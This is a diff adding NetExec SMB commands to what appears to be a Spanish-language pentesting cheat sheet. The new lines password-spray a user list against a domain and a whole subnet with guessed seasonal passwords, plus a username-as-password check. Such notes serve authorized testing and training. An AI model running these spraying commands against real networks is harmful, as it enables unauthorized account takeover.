@@ -44,6 +44,19 @@ nxc smb 192.168.1.0/24 -u 'Administrator' -p 'Password01' --local-auth
 nxc smb 192.168.1.10 -u 'juan.perez' -p 'Password01' -d miempresa.local
 ```
 
+```
+nxc smb 192.168.1.10 -u /ruta/usuarios.txt -p 'Marzo2026!' -d miempresa.local --continue-on-success
+```
+
+```
+nxc smb 192.168.1.0/24 -u /ruta/usuarios.txt -p 'Admin2026*' --local-auth --continue-on-success
+```
+
+```
+nxc smb 192.168.1.10 -u /ruta/usuarios.txt -p '' -d miempresa.local --user-as-pass --continue-on-success
+```
+>Comprueba mismo usuario y contraseña
+
 ## Enumetarion users
 
 ```
